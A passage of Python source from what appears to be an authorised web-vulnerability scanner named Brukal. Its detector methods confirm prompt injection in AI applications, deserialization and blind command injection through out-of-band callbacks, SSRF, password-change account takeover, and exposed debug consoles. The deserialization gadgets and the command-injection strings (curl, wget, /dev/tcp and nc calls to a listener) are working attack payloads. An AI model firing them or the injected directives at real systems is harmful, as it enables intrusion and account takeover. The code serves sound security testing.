        instructions over its own; a mere echo of the payload cannot produce it. The
        verdict is a string comparison, not an LLM's opinion.

        Two shapes are tried, because a chat API takes either a flat field
        ({"query": ...}) or the OpenAI-compatible `messages` array, and the wrong one is
        rejected outright — that is a false negative, not a clean result. Streamed (SSE)
        replies are reassembled before matching, since the answer arrives split across
        deltas.

        The response is then scanned for what the injection actually reached (a leaked
        system prompt, a secret, an acknowledged jailbreak) — those raise the severity to
        critical. Sent through the governed browser: scope- and scheme-gated like any
        other HTTP target, and only ever against an authorised AI application."""
        from . import aiscan
        if self.browser is None:
            return False
        shapes = [method]
        if method.upper() == "JSON":
            shapes.append("JSON-CHAT")          # flat field, then the messages array
        for shape in shapes:
            for canary, task in self._AI_CANARIES:
                for tpl in self._AI_INJECTIONS:
                    payload = tpl.format(task=task)
                    if canary in payload:    # never ship a canary the target could echo
                        continue
                    body, _s, _h = self._probe(url, param, payload, shape, extra)
                    if not body:
                        continue
                    answer = aiscan.visible_text(body)
                    if canary not in answer and canary not in body:
                        continue
                    worst = self._scan_ai_response(url, param, body)
                    sev = "critical" if worst == "critical" else "high"
                    note = (f"; the same response also leaked {worst}-severity content"
                            if worst else "")
                    self._record_confirmed(
                        url, "Prompt injection (model obeyed an injected instruction)",
                        sev, param,
                        f"injected directive {payload!r} → the model returned the canary "
                        f"{canary!r}, which appears nowhere in the request (body shape: "
                        f"{shape}){note}",
                        category="ai")
                    return True
        return False

    def _oob(self):
        """Lazily start Brukal's in-cage out-of-band listener (self-hosted collaborator).
        None when there's no real cage (fake/test) — blind checks then simply return
        False."""
        if getattr(self, "_oob_listener", "unset") != "unset":
            return self._oob_listener
        self._oob_listener = None
        container = getattr(getattr(self.executor, "_kali", None), "container", None)
        if container:
            from .oob import OOBListener
            lis = OOBListener(container)
            if lis.start():
                self._oob_listener = lis
        return self._oob_listener

    def confirm_deserialization_rce(self, url: str, param: str, method: str = "GET",
                                    extra=None) -> bool:
        """Insecure deserialization proved by an out-of-band callback (OWASP A08).

        A critical class with no coverage at all until now: DVNA's legacy bulk import
        hands user input to node-serialize, and Brukal had nothing that could see it —
        the coverage table did not even carry a row, so the silence was total.

        The proof is the SAME standard as blind command injection, which is why this
        reuses that machinery rather than inventing a weaker one: a token arrives at
        Brukal's in-cage listener, which only happens if the target executed something
        we supplied. A deserialization library that merely errors proves nothing and is
        deliberately not reported — an unparsed blob is not a vulnerability.

        Payloads are gadget SHAPES for the common runtimes, each pointing at the
        listener. Nothing destructive: they fetch a URL and stop."""
        import time
        lis = self._oob()
        if lis is None:
            return False
        token = "deser" + str(random.randint(10 ** 6, 10 ** 7))
        cb = lis.callback_url(token)
        # node-serialize: the IIFE runs at unserialize() time.
        node = ('{"brukal":"_$$ND_FUNC$$_function(){require(\'http\').get('
                f'\'{cb}\')}}()"}}')
        # PHP: an object whose destructor/wakeup reaches a fetch is app-specific, so the
        # generic shape here only proves the string is unserialised at all when paired
        # with a callback; kept for completeness across runtimes.
        php = f'O:8:"stdClass":1:{{s:6:"brukal";s:{len(cb)}:"{cb}";}}'
        # Python pickle, base64 of a REDUCE that calls urlopen.
        import base64 as _b64
        pick = _b64.b64encode(
            b"c__builtin__\n__import__\n(S'urllib.request'\ntRp0\n."
        ).decode()
        # Deliver each gadget BOTH ways. The caller's method is whatever the crawler saw
        # the parameter used with, and for an import/bulk feature that is a file field —
        # the one shape none of the other modes can produce. Trying only the discovered
        # method is what made this detector unable to fire on the target it was written
        # for; trying only multipart would miss a sink that takes a plain field.
        modes = [method] if method.upper() == "MULTIPART" else [method, "MULTIPART"]
        for payload in (node, php, pick):
            for mode in modes:
                _b = getattr(self, "_confirm_budget", None)
                if _b is not None and _b <= 0:
                    return False
                self._probe(url, param, payload, mode, extra)
        time.sleep(2)
        if lis.hit(token):
            self._record_confirmed(
                url, "Insecure deserialization (remote code execution)", "critical",
                param,
                f"a serialized object supplied in {param!r} was deserialised and the "
                f"embedded call reached Brukal's listener with token {token} — the "
                f"target executed code carried in the request body")
            return True
        return False

    def confirm_blind_rce(self, url: str, param: str, method: str = "GET", extra=None) -> bool:
        """Confirm BLIND OS command injection out-of-band: inject a command that calls
        Brukal's in-cage listener across the common separators; if the listener receives
        our unique token, the target executed it. Proof with no in-band evidence."""
        import time
        lis = self._oob()
        if lis is None:
            return False
        token = "rce" + str(random.randint(10 ** 6, 10 ** 7))
        cb, ip, port = lis.callback_url(token), lis.ip, lis.port
        rawget = f"GET /{token} HTTP/1.0\\r\\n\\r"
        # Try every common exfil method + shell separator — real targets vary widely in
        # which HTTP client they ship (curl/wget/python/perl/bash-tcp/nc). Sent as DATA
        # through the WEB path (no local shell); the target's shell runs them.
        exfils = (f"curl -s {cb}", f"wget -qO- {cb}",
                  f"python3 -c \"import urllib.request;urllib.request.urlopen('{cb}')\"",
                  f"perl -e 'use IO::Socket::INET;$s=IO::Socket::INET->new(\"{ip}:{port}\");"
                  f"print $s \"GET /{token} HTTP/1.0\\r\\n\\r\\n\"'",
                  f"bash -c 'exec 3<>/dev/tcp/{ip}/{port};echo -e \"{rawget}\\n\">&3'",
                  f"echo -e \"{rawget}\\n\"|nc {ip} {port}")
        for sep in (";", "|", "&&"):
            for ex in exfils:
                self._probe(url, param, f"127.0.0.1{sep}{ex}", method, extra)
        time.sleep(2)
        if lis.hit(token):
            self._record_confirmed(url, "Blind OS command injection (out-of-band)",
                                   "critical", param,
                                   f"target called our OOB listener with token {token}")
            return True
        return False

    def confirm_blind_ssrf(self, url: str, param: str, method: str = "GET", extra=None) -> bool:
        """Confirm BLIND SSRF out-of-band: point the parameter at Brukal's in-cage
        listener; a callback proves the server made the request."""
        import time
        lis = self._oob()
        if lis is None:
            return False
        token = "ssrf" + str(random.randint(10 ** 6, 10 ** 7))
        self._probe(url, param, lis.callback_url(token), method, extra)
        time.sleep(2)
        if lis.hit(token):
            self._record_confirmed(url, "Blind SSRF (out-of-band)", "high", param,
                                   f"server fetched our OOB listener with token {token}")
            return True
        return False

    def confirm_ssrf_sinks(self) -> int:
        """Deterministic SSRF sweep of URL-shaped JSON body fields on write endpoints — the
        sink an HTML-form / query-param crawl never surfaces, so the (already wired) blind-
        SSRF prover never received the field name. For each confirmed endpoint whose path
        hints at a URL-fetching action, each known sink field is POSTed as JSON carrying our
        OOB listener URL; a callback confirms. Gated on `allow_intrusive` (it WRITES) and on
        a live listener (the fake cage has none, so this is a no-op there). Returns the
        number confirmed. This is the harness firing the SSRF question at API bodies itself,
        rather than waiting for the model to name the sink."""
        if (self.browser is None or not self.allow_intrusive
                or self.surface is None or self._oob() is None):
            return 0
        import json as _json
        import time as _time
        from .web import WebAction
        lis = self._oob()
        base = (getattr(self.surface, "seed", "") or f"http://{self.target}/").rstrip("/")
        routes = list(getattr(self.surface, "confirmed_routes", []) or [])
        hint = ("contact", "mechanic", "import", "fetch", "webhook", "avatar", "convert",
                "upload", "url", "proxy", "callback", "notify", "subscribe", "preview")
        # FILTER, not rank: only endpoints whose path hints at a URL-fetching action are
        # probed. Posting a URL into every confirmed route would create unwanted state on
        # unrelated writes (a live run POSTed to /add_vehicle 70+ times); a sink is named.
        ranked = [r for r in routes if any(h in r.lower() for h in hint)]
        confirmed = 0
        for route in ranked[:8]:
            if "{" in route or (getattr(self, "_confirm_budget", 1) or 1) <= 0 \
                    or self._rate_limited:
                break
            url = route if route.startswith("http") else base + (
                route if route.startswith("/") else "/" + route)
            # ONE probe per endpoint: every sink field set to the OOB URL with a DISTINCT
            # token, so a single callback both confirms the SSRF and NAMES the field. This
            # is why the sweep is a batch and not one request per field — 40+ fields x a
            # per-probe wait would be prohibitive on a live run.
            tokens = {f: "ssrf" + str(random.randint(10 ** 7, 10 ** 8))
                      for f in self._URL_SINK_FIELDS}
            body = {f: lis.callback_url(tokens[f]) for f in self._URL_SINK_FIELDS}
            try:
                self.browser.run(WebAction(
                    "request", url=url, method="POST", body=_json.dumps(body),
                    headers={"Content-Type": "application/json"}))
            except Exception:
                continue
            if getattr(self, "_confirm_budget", None) is not None:
                self._confirm_budget -= 1
            _time.sleep(2)
            for field, tok in tokens.items():
                if lis.hit(tok):
                    self._record_confirmed(
                        url, "Blind SSRF (out-of-band)", "high", field,
                        f"the endpoint fetched our in-cage OOB listener from the "
                        f"{field!r} body field (token {tok}) — a caller-controlled URL "
                        f"in that field reaches server-side requests", category="api")
                    confirmed += 1
                    break
        return confirmed

    def confirm_bfla_password_takeover(self, change_url_template: str, login_url: str,
                                       victim: str, token: str,
                                       user_field: str = "username",
                                       pass_field: str = "password") -> bool:
        """Broken FUNCTION level authorization (OWASP API5): an authenticated principal
        performs a privileged ACTION on somebody else's object.

        BOLA — which Brukal already proves — is unauthorized *reading*. This is the
        write: our own low-privilege token changes another account's password. It is a
        strictly worse flaw and a different code path, which is why a target can pass
        the BOLA check and still be trivially takeoverable. A competing tool proved
        exactly this on a target where Brukal reported nothing.

        The proof is a login, not a status code. A 200 from the change endpoint only
        says the server accepted the request; it does not say the credential moved.
        So: set a password we choose on an account we do not own, then authenticate as
        that account with it. A session issued for the victim is not deniable.

        Writes to the target (it changes a credential), so it runs only under
        allow_intrusive — and it restores nothing, because it cannot: the original
        password is not knowable. That irreversibility is precisely why it is gated."""
        from .findings import Finding
        from .web import WebAction
        if (self.browser is None or not self.allow_intrusive
                or not (token or self.has_session()) or not victim):
            return False
        if "{" not in change_url_template:
            return False
        import re as _re
        new_password = "Brukal-BFLA-Pr00f!"
        target_url = _re.sub(r"\{[^}]*\}", victim, change_url_template, count=1)

        # The proof is "did a session get issued for the victim", and that is exactly
        # what login() decides — for a token API and a cookie app alike. Asking instead
        # whether the word "token" appears in the body answered "no" for every
        # server-rendered application, so the control passed vacuously and the proof
        # could never succeed. Run under a separate identity so establishing the
        # victim's session never overwrites our own.
        def login_as(user: str, password: str) -> bool:
            # We may never have logged in ourselves, so the app's login shape is not
            # always known. Try the one we used if there is one, then the other: a
            # JSON API rejects a urlencoded body and vice versa, and guessing wrong
            # once would make the control pass vacuously and the proof impossible.
            preferred = getattr(self, "_login_type", "") or ""
            tried = []
            for style in ([preferred] if preferred else []) + ["json", "form"]:
                if style in tried:
                    continue
                tried.append(style)
                with self._separate_identity():
                    if self.login(login_url, user, password, user_field=user_field,
                                  pass_field=pass_field, login_type=style):
                        return True
            return False

        # Control: our chosen password must not ALREADY authenticate the victim, or the
        # "proof" would be a coincidence rather than something we caused.
        if login_as(victim, new_password):
            return False

        _d, changed = self.browser.run(WebAction(
            "request", url=target_url, method="PUT",
            body=json.dumps({pass_field: new_password}),
            headers={"Content-Type": "application/json",
                     **({"Authorization": f"Bearer {token}"} if token else {})}))
        if changed is None or changed.status >= 400:
            return False

        if not login_as(victim, new_password):
            return False

        self.findings.add(Finding(
            title="Account takeover via broken function-level authorization",
            severity="critical", category="api",
            target=target_url, param=pass_field, confirmed=True,
            evidence=(f"the session of '{self.identity or 'another user'}' set "
                      f"'{victim}' password via PUT {target_url} (HTTP "
                      f"{changed.status}); logging in as '{victim}' with that password "
                      f"then succeeded, where it failed before the change"),
            source=(f"PUT {target_url} with our own session and "
                    f"{{\"{pass_field}\": \"...\"}}, then POST {login_url} as {victim}")))
        return True

    def confirm_destructive_endpoint_exposed(self, url: str,
                                             protected_url: str) -> bool:
        """A STATE-DESTROYING endpoint answers strangers — proved without invoking it.

        This closes a blind spot Brukal created for itself. `_is_destructive_path()`
        makes the unauthenticated-access check refuse `/createdb`, `/reset`, `/drop`
        and friends, because Brukal once wiped its own target by fetching one as an
        ordinary listing. The guard is right, and the cost of it was silence: a
        competing tool reported "unauthenticated database reset" on the same host while
        Brukal, which had the route in its map the whole time, said nothing. Safety and
        coverage are genuinely in tension here, and refusing to look was resolving it
        entirely one way.

        The way out is to ask a question the framework answers *before* the view runs.
        OPTIONS is dispatched by the routing layer, so it cannot reinitialise anything —
        but a bare 200 proves nothing on its own, because most applications never
        authenticate preflight. So it is a DIFFERENTIAL against a route the app itself
        says is protected: if the protected route refuses an anonymous OPTIONS and the
        destructive one does not, the difference is the app's own authorization talking.
        When both answer alike the check yields nothing, which is the correct result —
        an app that never guards OPTIONS cannot be interrogated this way.

        HEAD is deliberately NOT used: Flask and friends satisfy it by running the view
        and discarding the body, which is exactly the invocation being avoided."""
        from .findings import Finding
        from .web import WebAction
        if self.browser is None or not url or not protected_url:
            return False
        if not self._is_destructive_path(url):
            return False                      # ordinary routes go through the normal check

        def anonymous_options(target: str):
            saved_header = getattr(self.browser, "auth_header", "")
            saved_cookies = dict(getattr(self.browser, "_cookies", {}) or {})
            try:
                self.browser.auth_header = ""
                if hasattr(self.browser, "_cookies"):
                    self.browser._cookies = {}
                _d, r = self.browser.run(WebAction("request", url=target,
                                                   method="OPTIONS"))
                return r
            except Exception:
                return None
            finally:
                self.browser.auth_header = saved_header
                if hasattr(self.browser, "_cookies"):
                    self.browser._cookies = saved_cookies

        # Before spending requests: the application may already have SAID so. If its
        # own spec declares security on some operations and omits it from this
        # destructive one, that is the contract stating the endpoint is open — evidence
        # obtained without touching it, and it works where the OPTIONS differential
        # cannot because the framework answers preflight unauthenticated.
        declared = self._spec_says_unprotected(url)
        if declared:
            self.findings.add(Finding(
                title="Unauthenticated access to a state-destroying endpoint",
                severity="high", category="api",
                target=url, param="", confirmed=True,
                evidence=declared,
                source=("read from the target's own OpenAPI document; the endpoint was "
                        "NOT requested, because invoking it is the harm being reported")))
            return True

        guarded = anonymous_options(protected_url)
        exposed = anonymous_options(url)
        if guarded is None or exposed is None:
            return False
        # The reference route must actually be refused, or there is no baseline and the
        # comparison says nothing about authorization.
        if guarded.status not in (401, 403):
            return False
        if exposed.status in (401, 403, 404):
            return False

        self.findings.add(Finding(
            title="Unauthenticated access to a state-destroying endpoint",
            severity="high", category="api",
            target=url, param="", confirmed=True,
            evidence=(f"anonymous OPTIONS {url} answered HTTP {exposed.status} while the "
                      f"same request to {protected_url} — which the app declares "
                      f"protected — was refused with HTTP {guarded.status}. The endpoint "
                      f"was NOT invoked: OPTIONS is dispatched before the handler runs, "
                      f"so this proves reachability without triggering the operation"),
            source=(f"OPTIONS {url} vs OPTIONS {protected_url}, both anonymous. "
                    f"Deliberately never requested with a method that would execute it")))
        return True

    def confirm_no_session_revocation(self, change_url_template: str, login_url: str,
                                      verify_url: str, user: str, password: str,
                                      user_field: str = "username",
                                      pass_field: str = "password") -> bool:
        """A credential change does not invalidate sessions already issued (OWASP API2).

        The finding is an ABSENCE, which is why it needs three observations rather than
        one: a token works, the password behind it changes, and the SAME token still
        works. Any two of those alone are unremarkable. Together they say the only
        recovery action a user has after a compromise — change the password — does not
        actually evict the attacker.

        Runs on our OWN account and changes our OWN password, so nothing another
        principal depends on is touched; still gated on allow_intrusive because it
        writes a credential."""
        from .findings import Finding
        from .web import WebAction
        if self.browser is None or not self.allow_intrusive:
            return False
        if "{" not in (change_url_template or "") or not user:
            return False
        import re as _re
        rotated = "Brukal-Rotated-Pw1!"
        change_url = _re.sub(r"\{[^}]*\}", user, change_url_template, count=1)

        def login(pw: str):
            _d, r = self.browser.run(WebAction(
                "request", url=login_url, method="POST",
                body=json.dumps({user_field: user, pass_field: pw}),
                headers={"Content-Type": "application/json"}))
            return r

        first = login(password)
        if first is None or not _issued_session(first.body):
            return False
        token = ""
        m = _re.search(r'"(?:auth_token|access_token|token|jwt)"\s*:\s*"([^"]{8,})"',
                       first.body or "")
        if m:
            token = m.group(1)
        if not token:
            return False

        def whoami():
            _d, r = self.browser.run(WebAction(
                "request", url=verify_url, method="GET",
                headers={"Authorization": f"Bearer {token}"}))
            return r

        before = whoami()
        if before is None or before.status >= 400:
            return False                       # the token was never usable; nothing to say

        _d, changed = self.browser.run(WebAction(
            "request", url=change_url, method="PUT",
            body=json.dumps({pass_field: rotated}),
            headers={"Content-Type": "application/json",
                     "Authorization": f"Bearer {token}"}))
        if changed is None or changed.status >= 400:
            return False
        # The password really did move — otherwise "the token still works" is trivial.
        if not _issued_session((login(rotated).body if login(rotated) else "") or ""):
            return False

        after = whoami()
        if after is None or after.status >= 400:
            return False                       # correctly revoked: no finding

        self.findings.add(Finding(
            title="Session not revoked after credential change",
            severity="medium", category="api",
            target=verify_url, param="", confirmed=True,
            evidence=(f"a token issued before the password change still authenticated "
                      f"at {verify_url} (HTTP {after.status}) after the credential was "
                      f"rotated and the new password verified by a fresh login — the "
                      f"only remediation a compromised user has does not evict the "
                      f"holder of a stolen token"),
            source=(f"POST {login_url} -> token; GET {verify_url} OK; "
                    f"PUT {change_url}; fresh login with the new password OK; "
                    f"GET {verify_url} with the ORIGINAL token still OK")))
        return True

    def confirm_plaintext_password_storage(self, register_url: str, probe_urls,
                                           user_field: str = "username",
                                           pass_field: str = "password",
                                           email_field: str = "email") -> bool:
        """The application stores credentials in recoverable form.

        Proved by planting one: register with a password only we know, then look for that
        exact string coming back out of the application. A password that reappears
        verbatim was never hashed — no amount of arguing about algorithms is needed, and
        unlike reading the source it holds for a target whose code nobody has.

        The planted value is what makes this sound. Finding *a* password in a response
        proves an exposure; finding THE one we just chose proves storage, because a hash
        cannot reproduce it."""
        from .findings import Finding
        from .web import WebAction
        if self.browser is None or not self.allow_intrusive or not register_url:
            return False
        import uuid as _uuid
        marker = f"Brk-{_uuid.uuid4().hex[:12]}-Pw"
        user = f"brukal-pw-{_uuid.uuid4().hex[:8]}"
        try:
            _d, reg = self.browser.run(WebAction(
                "request", url=register_url, method="POST",
                body=json.dumps({user_field: user, pass_field: marker,
                                 email_field: f"{user}@example.invalid"}),
                headers={"Content-Type": "application/json"}))
        except Exception:
            return False
        if reg is None or reg.status >= 400:
            return False
        for url in list(probe_urls)[:4]:
            try:
                _d, r = self.browser.run(WebAction("request", url=url, method="GET"))
            except Exception:
                continue
            if r is None or not r.body or marker not in r.body:
                continue
            self.findings.add(Finding(
                title="Passwords stored in recoverable form",
                severity="high", category="api",
                target=url, param=pass_field, confirmed=True,
                evidence=(f"a password chosen by this test and submitted only to "
                          f"{register_url} came back verbatim from {url}; a stored hash "
                          f"cannot reproduce the original value, so credentials are held "
                          f"in plaintext or reversible form"),
                source=(f"POST {register_url} with a unique marker password, then "
                        f"GET {url} and search for that exact value")))
            return True
        return False

    def confirm_unthrottled_registration(self, register_url: str, attempts: int = 5,
                                         user_field: str = "username",
                                         pass_field: str = "password",
                                         email_field: str = "email") -> bool:
        """Account creation has no rate limit (OWASP API4).

        Distinct from an unthrottled LOGIN: this is unlimited creation of new principals,
        which is what turns a self-service signup into a resource-exhaustion and
        privilege-farming primitive — especially on a target that also accepts a
        privileged field at registration. Writes, so it is allow_intrusive-gated, and it
        stops at the first refusal rather than pressing on."""
        from .findings import Finding
        from .web import WebAction
        if self.browser is None or not self.allow_intrusive or not register_url:
            return False
        import uuid as _uuid
        made = 0
        for _ in range(max(2, attempts)):
            user = f"brukal-rl-{_uuid.uuid4().hex[:8]}"
            try:
                _d, r = self.browser.run(WebAction(
                    "request", url=register_url, method="POST",
                    body=json.dumps({user_field: user, pass_field: "Brukal-Rl-1!",
                                     email_field: f"{user}@example.invalid"}),
                    headers={"Content-Type": "application/json"}))
            except Exception:
                return False
            if r is None or r.status >= 400 or r.status in (429, 423):
                return False               # it DOES push back — no finding
            if re.search(r"(?i)too many|rate.?limit|captcha|throttl", (r.body or "")[:400]):
                return False
            made += 1
        self.findings.add(Finding(
            title="No rate limiting on account creation",
            severity="medium", category="api",
            target=register_url, param="", confirmed=True,
            evidence=(f"{made} accounts were created in immediate succession with no "
                      f"throttling, captcha or lockout at any point"),
            source=f"POST {register_url} x{made} with distinct usernames"))
        return True

    def _absolute_route(self, route: str) -> str:
        """A mined route as an absolute URL against the crawl seed."""
        if not route:
            return ""
        if route.startswith("http"):
            return route
        from urllib.parse import urljoin as _urljoin
        surface = getattr(self, "surface", None)
        base = (getattr(surface, "seed", "") if surface else "") or f"http://{self.target}/"
        return _urljoin(base, route)

    def _spec_says_unprotected(self, url: str) -> str:
        """Evidence sentence if the app's own spec declares this destructive route
        without authentication, or "".

        The comparison against OTHER operations is what makes it meaningful: a document
        that declares security nowhere says nothing about this endpoint, while one that
        protects two operations and leaves the database-reset open is making a
        statement."""
        surface = getattr(self, "surface", None)
        if surface is None:
            return ""
        protected = {p for _m, p in (getattr(surface, "protected_routes", []) or [])}
        if not protected:
            return ""                      # no baseline: the spec protects nothing
        from urllib.parse import urlsplit
        path = urlsplit(url).path or url
        routes = [r for r in (getattr(surface, "api_routes", []) or [])
                  if r and (r == path or path.endswith(r))]
        if not routes:
            return ""                      # not a route the spec declares
        if any(r in protected for r in routes):
            return ""                      # the spec DOES protect it
        return (f"the target's own OpenAPI document declares {path} while listing no "
                f"security requirement for it, though it does declare one for "
                f"{len(protected)} other operation(s) — the application states that this "
                f"state-destroying endpoint needs no authentication")

    def confirm_debug_console(self, base_url: str) -> bool:
        """An INTERACTIVE debugger exposed to the network (Werkzeug/Flask debug mode).

        Brukal already flags a stack trace as `low` when one happens to appear in a
        body. That is a different and much smaller thing than this: the Werkzeug console
        is a remote Python REPL, PIN-gated at best, and the same debug pages disclose
        the app's `SECRET` — which on a Flask app is usually the token-signing key, so
        it chains straight into forgery. Reported critical because the consequence is
        code execution, not information.

        Read-only and one request: ask for the console and see whether the framework
        answers with its own debugger, rather than provoking a crash on a live target."""
        from .findings import Finding
        from .web import WebAction
        if self.browser is None:
            return False
        from urllib.parse import urljoin as _urljoin
        url = _urljoin(base_url if base_url.endswith("/") else base_url + "/", "console")
        try:
            _d, r = self.browser.run(WebAction("request", url=url, method="GET"))
        except Exception:
            return False
        body = (r.body if r else "") or ""
        if r is None or r.status >= 400:
            return False
        # The console page identifies itself; a generic 200 must not be mistaken for it.
        markers = ("werkzeug debugger", "__debugger__", "console.js", "debugger.js",
                   "interactive console")
        low = body.lower()
        if not any(m in low for m in markers):
            return False
        secret = re.search(r'SECRET\s*=\s*["\']([^"\']{6,})["\']', body)
        self.findings.add(Finding(
            title="Interactive debug console exposed",
            severity="critical", category="web",
            target=url, param="", confirmed=True,
            evidence=(f"GET {url} returned the framework's interactive debugger "
                      f"(HTTP {r.status})"
                      + (f"; the page also discloses SECRET={secret.group(1)[:12]}…"
                         if secret else "")),
            source=f"GET {url}"))
        return True

    def _signup_form(self, fetch: bool = True):
        """The application's own registration form, or None.

        Read from the crawled surface rather than assumed. The existing signup helper
        posts a JSON body with three guessed field names; DVNA's form wants five
        url-encoded ones including a password confirmation, and rejects anything else.
        An app that tells you its form fields should not be guessed at.

        The fallback exists because an AUTHENTICATED crawl never sees a signup form:
        /register redirects a logged-in user straight to the application, so the form is
        visible only to strangers. The surface therefore contained no signup form on
        exactly the runs that could use one, and the privilege check declined every time
        with no way to tell that apart from a target that was sound. Callers are already
        inside `_separate_identity`, so this fetch is made as a stranger."""
        surface = getattr(self, "surface", None)
        for form in (getattr(surface, "forms", []) or []):
            action = (getattr(form, "action", "") or "").lower()
            method = (getattr(form, "method", "") or "").upper()
            if method == "POST" and self._SIGNUP_RE.search(action):
                return form
        if not fetch or self.browser is None:
            return None
        # Remember the answer, INCLUDING "there is none". Several detectors ask, and the
        # fallback costs up to five speculative fetches each time — which turned a
        # fifteen-second test suite into a hundred-and-forty-second one and would spend
        # the same requests repeatedly against a real target. A signup form does not
        # appear or vanish partway through an engagement.
        if hasattr(self, "_signup_form_cache"):
            return self._signup_form_cache
        self._signup_form_cache = None

        from . import webmap
        from .web import WebAction
        seen, candidates = set(), []
        for route in list(getattr(surface, "api_routes", []) or []) \
                + [p for p in (getattr(surface, "pages", {}) or {})]:
            if route and self._SIGNUP_RE.search(route):
                url = self._absolute_route(route)
                if url and url not in seen:
                    seen.add(url)
                    candidates.append(url)
        for guess in ("register", "signup", "users/register", "account/register"):
            url = self._absolute_route("/" + guess)
            if url and url not in seen:
                seen.add(url)
                candidates.append(url)
        for url in candidates[:5]:
            try:
                _d, r = self.browser.run(WebAction("request", url=url, method="GET"))
            except Exception:
                continue
            if r is None or r.status != 200 or not r.body:
                continue
            _links, forms, _params = webmap.extract(url, r.body)
            for form in forms:
                if (getattr(form, "method", "") or "").upper() != "POST":
                    continue
                if any((t or "").lower() == "password"
                       for _n, t in (getattr(form, "inputs", []) or [])):
                    self._signup_form_cache = form
                    return form
        return None

    def _register_account(self):
        """Create a fresh account through the app's OWN signup form.

        Returns (username, password) or None. This is what makes a privilege claim
        sound: an account Brukal created seconds ago through the public form is, by
        construction, whatever the application grants a stranger who signs up — so
        anything privileged it can reach is reachable by any stranger. Asserting the
        same thing about operator-supplied credentials would be worthless, because
        those may well belong to an administrator."""
        from urllib.parse import urlencode

        from .web import WebAction
        form = self._signup_form()
        if form is None or self.browser is None or not self.allow_intrusive:
            return None
        import uuid as _uuid
        tag = _uuid.uuid4().hex[:10]
        user, password = f"brk{tag}", "Brukal-Signup-1!"
        body = {}
        for field, ftype in (getattr(form, "inputs", []) or []):
            if (ftype or "").lower() == "file":
                continue
            role = ""
            for name, rx in self._FIELD_ROLES:
                if rx.search(field):
                    role = name
                    break
            if not role and (ftype or "").lower() == "password":
                role = "password"          # the type says so even when the name does not
            body[field] = {"password": password, "confirm": password,
                           "email": f"{user}@example.invalid", "username": user,
                           "name": f"Brukal {tag}"}.get(role, user)
        if not any(v == password for v in body.values()):
            return None                      # no password field: not a signup we understand
        try:
            _d, r = self.browser.run(WebAction(
                "request", url=form.action, method="POST", body=urlencode(body),
                headers={"Content-Type": "application/x-www-form-urlencoded"}))
        except Exception:
            return None
        if r is None or (r.status or 0) >= 400:
            return None
        # A signup that failed validation re-renders the form; one that worked redirects
        # or stops showing it. Same reasoning as login(), and for the same reason: the
        # status code alone does not say an account exists.
        if r.status == 200 and re.search(r"type=[\"']?password", (r.body or ""), re.I):
            return None
        return user, password

    @staticmethod
    def _we_refused(decision, result) -> bool:
        """Did OUR side stop this probe, rather than the target answering it?

        A gate denial (`hard:web-rate` above all), a transport failure, or a cage that
        never made the request all come back the same shape a 404 does — and run 14 paid
        for the difference. Its rate limiter denied both the bare and the composed
        `/v2/user/dashboard`; the code had already marked them tried, so crAPI's whole
        identity surface was written off as absent without the target being asked once.

        This is the same law origin-aware health is built on: a silence WE caused is not
        evidence about the target, and must never be cached as if it were."""
        if result is not None and getattr(result, "status", None):
            return False
        return decision is None or getattr(decision, "verdict", "") != "ALLOW" \
            or result is None

    def _absent_signature(self, prefix: str):
        """What THIS mount point answers for a path that certainly does not exist.

        Measured on crAPI, 2026-09-18:

            prefix            an ABSENT path answers      a REAL path answers
            /identity/api     401                         405
            /workshop/api     404                         500
            /community/api    404                         401

        The identity service answers 401 to everything under its prefix, including
        `/identity/api/total/nonsense/xyz`. Route confirmation treated any non-404 as
        "this route exists", so every phantom under that prefix was confirmed — a direct
        probe produced `/identity/api/identity/api/auth/login [GET]` — while the real
        dashboard, which answers 404 to a stranger because it reads the Authorization
        header, looked absent. Exactly inverted, and everything downstream consumed it.

        No global rule can work: 401 means "absent" under /identity/api and "real" under
        /community/api. Existence is only meaningful against a control taken under the
        SAME prefix. One probe per prefix, cached.

        Returns the status of an absent path, or None when it could not be taken — and a
        control that cannot be taken means existence cannot be judged, which is the one
        case that must confirm nothing.
        """
        from .web import WebAction
        from urllib.parse import urljoin as _urljoin
        cache = getattr(self, "_absent_sigs", None)
        if cache is None:
            cache = self._absent_sigs = {}
        if prefix in cache:
            return cache[prefix]
        base = (getattr(self.surface, "seed", "") or f"http://{self.target}/")
        probe = f"{prefix.rstrip('/')}/brukal-absent-{uuid.uuid4().hex[:10]}"
        try:
            # The control is taken in the SAME state as the candidates it will be compared
            # against, or the comparison is between two different worlds.
            with self._as_identity("self", "probe", _urljoin(base, probe)):
                _d, r = self.browser.run(WebAction("request", method="GET",
                                                   url=_urljoin(base, probe)))
            if self._we_refused(_d, r):
                # NOT CACHED. A control we were refused would fail-close this prefix's
                # every route for the rest of the run, from one denial.
                return None
        except Exception:
            return None
        sig = getattr(r, "status", None)
        cache[prefix] = sig
        if sig is not None and sig != 404:
            self.note(f"[crawl] {prefix} answers {sig} for paths that do not exist — "
                      f"route existence there is judged against that, not against 404")
        return sig

    def _route_exists(self, path: str, status) -> bool:
        """Does this answer differ from what an absent path under the same prefix gets?"""
        if not status:
            return False
        segs = [s for s in path.split("?")[0].split("/") if s]
        # The MOUNT, not the route. Two segments for a deep path (/identity/api/... ->
        # /identity/api), one for a shallow one (/auth/login -> /auth) — otherwise a
        # two-segment route becomes its own prefix and every route pays for its own
        # control probe instead of sharing the mount's.
        prefix = ("/" + "/".join(segs[:2])) if len(segs) >= 3 else ("/" + (segs[0] if segs else ""))
        sig = self._absent_signature(prefix)
        if sig is None:
            return False                      # no control, no judgement (fail-closed)
        return int(status) != int(sig)

    def discover_mounts(self, candidates: list, cap: int = 12) -> list:
        """CONFIRM which candidate segments the gateway actually routes to a backend.

        `webmap.extract_mount_candidates` reads service names out of the application's
        own bundle — crAPI ships `og="identity/", ig="workshop/", ag="chatbot/",
        lg="community/"` — but a name in a bundle is a LEAD. Nothing derived is acted on
        until one gated request has confirmed it, which is the same law
        `resolve_mined_routes` follows for compositions.

        THE EVIDENCE (live crAPI, 2026-09-19): a gateway that routes a prefix to a service
        answers an impossible path under it DIFFERENTLY from how it answers an impossible
        path at the root, because a different program produced the error.

            404 / 159 bytes   /zzz             <- the front door itself
            404 / 179 bytes   /workshop/zzz    <- the workshop service
            404 /  19 bytes   /community/zzz   <- the community service
            401 /  49 bytes   /identity/zzz    <- identity's auth filter

        One baseline request plus one per candidate, capped. FAIL-CLOSED: on a host where
        every unknown path answers the same — a soft-404 SPA, a catch-all gateway —
        nothing differs from the baseline and NOTHING is confirmed, because inventing
        mounts there would put a fabricated surface in front of the model.

        Why this is not a wordlist: every segment tested came out of the target's own
